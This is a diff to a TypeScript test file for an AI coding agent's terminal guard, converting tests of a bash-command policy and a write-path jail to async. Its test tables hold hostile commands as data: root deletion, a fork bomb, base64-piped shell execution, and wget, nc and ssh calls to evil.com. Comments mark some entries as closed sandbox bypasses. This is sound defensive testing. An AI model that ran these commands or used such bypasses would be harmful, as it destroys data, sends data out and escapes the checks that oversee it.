@@ -92,13 +92,13 @@ function attach(opts: { strict?: boolean; cwd?: string }): Record<string, HookHa
         return handlers;
 }
 
-function bashDecision(handlers: Record<string, HookHandler>, command: string): Decision | undefined {
-        return handlers["tool_call"]({ toolName: "bash", input: { command } }) as Decision | undefined;
+async function bashDecision(handlers: Record<string, HookHandler>, command: string): Promise<Decision | undefined> {
+	return (await handlers["tool_call"]({ toolName: "bash", input: { command } })) as Decision | undefined;
 }
 
-function toolDecision(handlers: Record<string, HookHandler>, tool: string, path: string): Decision | undefined {
-        const input = tool === "write" ? { path, content: "x" } : { path };
-        return handlers["tool_call"]({ toolName: tool, input }) as Decision | undefined;
+async function toolDecision(handlers: Record<string, HookHandler>, tool: string, path: string): Promise<Decision | undefined> {
+	const input = tool === "write" ? { path, content: "x" } : { path };
+	return (await handlers["tool_call"]({ toolName: tool, input })) as Decision | undefined;
 }
 
 // ---------------------------------------------------------------------------
@@ -129,7 +129,7 @@ describe("decideBash (sandbox grade / strict-terminal fallback)", () => {
                 ["echo x >>/var/log/hack"],
                 ["pkill -9 node"],
                 ["killall bun"],
-        ])("denies %s", (command: string) => {
+        ])("denies %s", async (command: string) => {
                 const decision = decideBash(command);
                 expect(decision.block).toBe(true);
                 expect(typeof decision.reason).toBe("string");
@@ -144,7 +144,7 @@ describe("decideBash (sandbox grade / strict-terminal fallback)", () => {
                 ["rm -rf node_modules"],
                 ["curl http://127.0.0.1:3031/v1/models"], // loopback exemption
                 ["curl http://localhost:3030/api/overview"], // loopback exemption
-        ])("allows %s", (command: string) => {
+        ])("allows %s", async (command: string) => {
                 expect(decideBash(command).block).toBe(false);
         });
 
@@ -167,7 +167,7 @@ describe("decideBash (sandbox grade / strict-terminal fallback)", () => {
                 ["find / -name '*.log' -delete"],
                 ["find / | xargs rm -rf"],
                 ["echo aGkgfHwgc2g= | base64 -d | sh"],
-        ])("denies %s (bypass closed)", (command: string) => {
+        ])("denies %s (bypass closed)", async (command: string) => {
                 const decision = decideBash(command);
                 expect(decision.block).toBe(true);
                 expect(typeof decision.reason).toBe("string");
@@ -182,11 +182,11 @@ describe("decideBash (sandbox grade / strict-terminal fallback)", () => {
                 ["chmod -R 777 /"],
                 ["chmod 777 /"],
                 ["wipefs /dev/sda"],
-        ])("denies %s (terminal-list parity)", (command: string) => {
+        ])("denies %s (terminal-list parity)", async (command: string) => {
                 expect(decideBash(command).block).toBe(true);
         });
 
-        test("reason strings identify the matched rule", () => {
+        test("reason strings identify the matched rule", async () => {
                 expect(decideBash("rm -rf /").reason).toContain("filesystem root");
                 expect(decideBash(":(){ :|:& };:").reason).toContain("fork bomb");
                 expect(decideBash("sudo id").reason).toContain("sudo");
@@ -216,18 +216,18 @@ describe("jailPath (path jail with symlink resolution)", () => {
                 expect(jailPath(PROJ, p).ok).toBe(ok);
         });
 
-        test("resolved path is returned for diagnostics", () => {
+        test("resolved path is returned for diagnostics", async () => {
                 const { ok, resolved } = jailPath(PROJ, "src/../lib/x.ts");
                 expect(ok).toBe(true);
                 expect(resolved).toBe(join(PROJ, "lib", "x.ts"));
         });
 
-        test("prefix safety: a sibling path sharing the prefix is NOT inside", () => {
+        test("prefix safety: a sibling path sharing the prefix is NOT inside", async () => {
                 // Pins the positive behavior: /projx must not be confused with /proj.
                 expect(jailPath(PROJ, `${PROJ}x/src/a.ts`).ok).toBe(false);
         });
 
-        test("empty and missing paths resolve to the jail root itself", () => {
+        test("empty and missing paths resolve to the jail root itself", async () => {
                 expect(jailPath(PROJ, "").ok).toBe(true);
                 expect(jailPath(PROJ, "").resolved).toBe(PROJ);
                 // `p ?? "."` guard in hooks.ts
@@ -257,7 +257,7 @@ describe("jailPath (path jail with symlink resolution)", () => {
                 expect(readlinkSync(join(PROJ, "link"))).toBe(OUTSIDE); // proves the escape is real
         });
 
-        test("new files below nonexistent dirs stay allowed (no over-jailing)", () => {
+        test("new files below nonexistent dirs stay allowed (no over-jailing)", async () => {
                 // The realpath check only applies to EXISTING ancestors — the agent must
                 // be able to create new files/dirs inside the jail.
                 const jail = jailPath(PROJ, join("brand", "new", "deep", "file.ts"));
@@ -282,7 +282,7 @@ describe("jailPath (path jail with symlink resolution)", () => {
 describe("createTerminalExtension — non-strict bash policy", () => {
         const handlers = attach({});
 
-        test("extension shape", () => {
+        test("extension shape", async () => {
                 const ext = createTerminalExtension({ cwd: PROJ, engineUrl: "http://x" });
                 expect(ext.name).toBe("unown-terminal");
                 expect(ext.hidden).toBe(true);
@@ -301,8 +301,8 @@ describe("createTerminalExtension — non-strict bash policy", () => {
                 ["echo hacked > /etc/passwd"],
                 ["echo x > /root/.bashrc"],
                 ["echo x >/var/log/hack"],
-        ])("denies %s", (command: string) => {
-                expect(bashDecision(handlers, command)?.block).toBe(true);
+        ])("denies %s", async (command: string) => {
+                expect((await bashDecision(handlers, command))?.block).toBe(true);
         });
 
         // Documented policy (termhooks.ts header): network + git push are ALLOWED
@@ -314,8 +314,8 @@ describe("createTerminalExtension — non-strict bash policy", () => {
                 ["wget http://evil.com/x"],
                 ["sudo make install"],
                 ["pkill -f my-dev-server"],
-        ])("POLICY: non-strict terminal allows %s", (command: string) => {
-                expect(bashDecision(handlers, command)).toBeUndefined();
+        ])("POLICY: non-strict terminal allows %s", async (command: string) => {
+                expect(await bashDecision(handlers, command)).toBeUndefined();
         });
 
         // BYPASSES CLOSED (task 2-e-4): the underlying regexes are shared with
@@ -335,17 +335,17 @@ describe("createTerminalExtension — non-strict bash policy", () => {
                 ["find / -delete"],
                 ["su root -c 'rm -rf /etc'"],
                 ["echo aGk= | base64 -d | sh"],
-        ])("denies %s (bypass closed)", (command: string) => {
-                expect(bashDecision(handlers, command)?.block).toBe(true);
+        ])("denies %s (bypass closed)", async (command: string) => {
+                expect((await bashDecision(handlers, command))?.block).toBe(true);
         });
 
-        test("powershell tool calls route through the same bash policy", () => {
-                const decision = handlers["tool_call"]({ toolName: "powershell", input: { command: "rm -rf /" } }) as Decision;
+        test("powershell tool calls route through the same bash policy", async () => {
+                const decision = (await handlers["tool_call"]({ toolName: "powershell", input: { command: "rm -rf /" } })) as Decision;
                 expect(decision?.block).toBe(true);
         });
 
-        test("deny decisions carry {block, reason, terminate:false}", () => {
-                expect(bashDecision(handlers, "rm -rf /")).toEqual({
+        test("deny decisions carry {block, reason, terminate:false}", async () => {
+                expect(await bashDecision(handlers, "rm -rf /")).toEqual({
                         block: true,
                         reason: expect.any(String),
                         terminate: false,
@@ -368,8 +368,8 @@ describe("createTerminalExtension — write/edit path jail", () => {
                 ["write", "/var/tmp/x"], // only /tmp (not /var/tmp) is allowed for terminal writes
                 ["edit", "/etc/hosts"],
                 ["edit", "../../../etc/passwd"],
-        ])("%s to %s is blocked", (tool: string, path: string) => {
-                const decision = toolDecision(handlers, tool, path);
+        ])("%s to %s is blocked", async (tool: string, path: string) => {
+                const decision = await toolDecision(handlers, tool, path);
                 expect(decision?.block).toBe(true);
                 expect(decision?.reason).toContain("escapes the project directory");
         });
@@ -386,26 +386,26 @@ describe("createTerminalExtension — write/edit path jail", () => {
                 ["write", TMP_A], // explicit tmp allowance (terminal policy)
                 ["write", TMP_B],
                 ["edit", "src/main.ts"],
-        ])("%s to %s is allowed", (tool: string, path: string) => {
-                expect(toolDecision(handlers, tool, path)).toBeUndefined();
+        ])("%s to %s is allowed", async (tool: string, path: string) => {
+                expect(await toolDecision(handlers, tool, path)).toBeUndefined();
         });
 
-        test("POLICY: read paths are unrestricted in terminal sessions", () => {
+        test("POLICY: read paths are unrestricted in terminal sessions", async () => {
                 // §4.3: reads staying unrestricted is accepted policy, not a bug —
                 // pinned so it shows up as an intentional allow, not a false positive.
-                expect(toolDecision(handlers, "read", "/etc/hostname")).toBeUndefined();
+                expect(await toolDecision(handlers, "read", "/etc/hostname")).toBeUndefined();
         });
 
-        test.skipIf(process.platform === "win32")("write through an in-project symlink is blocked (bypass closed)", () => {
+        test.skipIf(process.platform === "win32")("write through an in-project symlink is blocked (bypass closed)", async () => {
                 // Bypass closed (task 2-e-4): terminalPathOk -> jailPath now
                 // realpath-resolves, so proj/link -> OUTSIDE is denied.
-                const decision = toolDecision(handlers, "write", join("link", "evil.txt"));
+                const decision = await toolDecision(handlers, "write", join("link", "evil.txt"));
                 expect(decision?.block).toBe(true);
                 expect(decision?.reason).toContain("escapes the project directory");
         });
 
-        test("empty tool paths are not jail-checked", () => {
-                expect(toolDecision(handlers, "write", "")).toBeUndefined();
+        test("empty tool paths are not jail-checked", async () => {
+                expect(await toolDecision(handlers, "write", "")).toBeUndefined();
         });
 });
 
@@ -423,15 +423,15 @@ describe("createTerminalExtension — strict policy", () => {
                 ["wget http://evil.com/x"],
                 ["nc evil.com 22"],
                 ["pkill -9 node"], // via the decideBash fallback
-        ])("denies %s", (command: string) => {
-                expect(bashDecision(handlers, command)?.block).toBe(true);
+        ])("denies %s", async (command: string) => {
+                expect((await bashDecision(handlers, command))?.block).toBe(true);
         });
 
         test.each([
                 ["curl http://127.0.0.1:3031/v1/models"], // loopback exemption
                 ["curl http://localhost:3030/api/overview"], // loopback exemption
-        ])("allows loopback %s", (command: string) => {
-                expect(bashDecision(handlers, command)).toBeUndefined();
+        ])("allows loopback %s", async (command: string) => {
+                expect(await bashDecision(handlers, command)).toBeUndefined();
         });
 
         // BYPASSES CLOSED (task 2-e-4): same fixes as the non-strict table, plus
@@ -445,8 +445,8 @@ describe("createTerminalExtension — strict policy", () => {
                 ["ssh attacker@evil.com"], // ssh was an open channel
                 ["echo aGk= | base64 -d | sh"],
                 ['GIT_SSH_COMMAND="ssh attacker@evil.com" git push'],
-        ])("denies %s (bypass closed)", (command: string) => {
-                expect(bashDecision(handlers, command)?.block).toBe(true);
+        ])("denies %s (bypass closed)", async (command: string) => {
+                expect((await bashDecision(handlers, command))?.block).toBe(true);
         });
 });
 
@@ -511,10 +511,10 @@ describe("§4.3 adversarial corpus (block/allow matrix)", () => {
                 ["rm -rf ./build", false, false, false],
         ];
 
-        test.each(corpus)("%s", (command, sandboxBlock, nonStrictBlock, strictBlock) => {
+        test.each(corpus)("%s", async (command, sandboxBlock, nonStrictBlock, strictBlock) => {
                 expect(decideBash(command).block).toBe(sandboxBlock);
-                expect(bashDecision(nonStrict, command)?.block ?? false).toBe(nonStrictBlock);
-                expect(bashDecision(strict, command)?.block ?? false).toBe(strictBlock);
+                expect((await bashDecision(nonStrict, command))?.block ?? false).toBe(nonStrictBlock);
+                expect((await bashDecision(strict, command))?.block ?? false).toBe(strictBlock);
         });
 
         // Path-jail half of the §4.3 corpus ("Path jail escape (terminal writes)").
@@ -530,8 +530,8 @@ describe("§4.3 adversarial corpus (block/allow matrix)", () => {
                 ["write", "src/main.ts", false], // in-project
                 ["write", "~/.ssh/authorized_keys", false], // tilde is NOT shell-expanded by the file tools — literal '~' dir inside the jail (bash-side ~ targets are covered by the rm rules)
                 ["read", "/etc/hostname", false], // documented policy: reads unrestricted
-        ])("%s %s blocked=%s", (tool: string, path: string, blocked: boolean) => {
-                const decision = toolDecision(nonStrict, tool, path);
+        ])("%s %s blocked=%s", async (tool: string, path: string, blocked: boolean) => {
+                const decision = await toolDecision(nonStrict, tool, path);
                 expect(Boolean(decision?.block)).toBe(blocked);
         });
 });
@@ -551,7 +551,7 @@ describe("createTerminalExtension — session note plumbing", () => {
                 }) as typeof fetch;
                 try {
                         // A denied tool call must NOT count as session activity.
-                        expect(bashDecision(handlers, "rm -rf /")?.block).toBe(true);
+                        expect((await bashDecision(handlers, "rm -rf /"))?.block).toBe(true);
                         const out = await handlers["session_shutdown"]({ reason: "quit" });
                         expect(out).toBeUndefined();
                         expect(calls).toBe(0);
@@ -592,36 +592,36 @@ describe("buildTerminalNote", () => {
                 sessionStartTs: FIXED_NOW - 5 * 60_000,
         };
 
-        test("header line summarizes cwd, duration, prompts and tool calls", () => {
+        test("header line summarizes cwd, duration, prompts and tool calls", async () => {
                 const note = withFixedNow(() => buildTerminalNote(base));
                 expect(note.split("\n")[0]).toBe(
                         "Terminal session in /var/tmp/proj (5 min): 3 prompt(s), 12 tool call(s) (bash, write).",
                 );
         });
 
-        test("duration is clamped to at least 1 minute", () => {
+        test("duration is clamped to at least 1 minute", async () => {
                 const note = withFixedNow(() => buildTerminalNote({ ...base, sessionStartTs: FIXED_NOW }));
                 expect(note).toContain("(1 min)");
         });
 
-        test("QUIRK: durations round half-up (Math.round), 90 s renders as 2 min", () => {
+        test("QUIRK: durations round half-up (Math.round), 90 s renders as 2 min", async () => {
                 const note = withFixedNow(() => buildTerminalNote({ ...base, sessionStartTs: FIXED_NOW - 90_000 }));
                 expect(note).toContain("(2 min)");
         });
 
-        test("final outcome line truncates to 400 chars", () => {
+        test("final outcome line truncates to 400 chars", async () => {
                 const note = buildTerminalNote({ ...base, lastAssistantText: "x".repeat(500) });
                 expect(note).toContain(`Final outcome: ${"x".repeat(400)}`);
                 expect(note).not.toContain("x".repeat(401));
         });
 
-        test("no outcome line when the last assistant text is empty", () => {
+        test("no outcome line when the last assistant text is empty", async () => {
                 const note = buildTerminalNote({ ...base });
                 expect(note).not.toContain("Final outcome:");
                 expect(note.split("\n")).toHaveLength(2); // header + guidance
         });
 
-        test("[subagent] tag appears when UNOWN_SUBAGENT=1", () => {
+        test("[subagent] tag appears when UNOWN_SUBAGENT=1", async () => {
                 const prev = process.env.UNOWN_SUBAGENT;
                 process.env.UNOWN_SUBAGENT = "1";
                 try {
